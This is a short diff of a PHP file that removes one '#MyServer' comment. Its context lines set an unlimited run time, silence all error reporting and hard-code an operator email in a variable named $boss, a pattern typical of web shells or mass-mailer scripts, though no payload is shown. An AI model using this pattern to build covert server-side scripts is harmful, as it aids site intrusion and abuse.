@@ -19,7 +19,6 @@ h1{ color: #000; text-decoration: none; border-radius:0px; border:0px;margin:0px
 
 
 <?php
-#MyServer
 set_time_limit(0);
 error_reporting(0);
 $boss = 'zsec@gmx.com';
